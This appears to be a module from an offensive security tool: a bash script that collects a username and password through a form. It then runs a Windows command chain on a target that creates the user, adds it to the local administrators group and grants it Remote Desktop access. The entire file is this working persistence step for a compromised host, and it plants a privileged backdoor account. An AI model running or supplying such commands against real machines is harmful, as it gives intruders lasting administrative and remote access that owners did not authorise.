#!/bin/bash

: '
Net: Add use, add to administrators and RDP groups.
'

# Generate GUI form items (label, type (optional: default text), name, default (optional))
USERNAME_FIELD=$(form_item  "username" "new_username" "${SETTING_DEFAULT_USER}")
PASSWORD_FIELD=$(form_item  "password" "new_password" "${SETTING_DEFAULT_PASSWORD}")

# Generate GUI form
generate_form "${USERNAME_FIELD}" "${PASSWORD_FIELD}"

USERNAME=${form_data["new_username"]}
PASSWORD=${form_data["new_password"]}

execute_command "net user ${USERNAME} ${PASSWORD} /add && net localgroup administrators ${USERNAME} /add && net localgroup \"Remote Desktop Users\" ${USERNAME} /add"
create_new_line
